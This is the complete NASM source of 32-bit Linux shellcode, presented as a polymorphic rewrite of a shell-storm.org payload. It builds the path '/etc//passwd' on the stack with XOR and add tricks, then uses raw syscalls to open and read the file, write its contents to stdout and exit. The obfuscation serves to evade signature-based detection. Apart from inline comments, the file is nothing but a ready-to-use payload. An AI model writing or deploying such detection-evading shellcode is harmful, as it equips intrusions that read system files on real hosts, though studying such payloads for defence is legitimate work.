; Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-842.php
global _start

section .text

_start:
                                  ; clear registers
  sub ebx, ebx                    ; clear ebx
  mul ebx                         ; clear eax, and edx

  ; open('/etc//passwd', NULL)
  add eax, 0x5                    ; open(2)
  push ebx                        ; push NULL
  mov ebx, 0x64777364             ; preparing ebx for 'sswd'
  add bl, 0xF                     ; ebx = 'sswd'
  push ebx                        ; push into stack
  push ebx                        ; push again, but will be overwritten
  xor ebx, 0x5075c10              ; ebx = 'c/pa'
  mov dword [esp], ebx            ; overwrite the top of stack with ebx
  mov dword [esp-4], 0x74652f2f   ; 4 bytes above stack = '//et'
  sub esp, 4                      ; adjust the stack
  mov ebx, esp                    ; ebx = current stack address
  int 0x80                        ; syscall open(2)

  ; read(fd, esp, 4095)
  mov cl, 0x3                     ; read(2)
  xchg cl, al                     ; eax = 3, ecx = fd; fd is return value from open(2)
  xchg ecx, ebx                   ; ebx = fd, ecx = <esp_address>
  mov dx, 0xfff                   ; read up to 4095 bytes
  int 0x80                        ; syscall read(2)

  ; write(fd, esp, size);
  xchg eax, edx                   ; edx = byte size read - return from read(2); eax = 4095
  shr ax, 0x10                    ; clear ax, 0x0fff -> 0x0000
  mov bl, al                      ; clear bl
  add al, 0x4                     ; write(2)
  inc bl                          ; stdout
  int 0x80                        ; syscall write(2)

  ; exit
  xchg eax, ebx                   ; _exit(2)
  int 0x80                        ; syscall _exit(2)
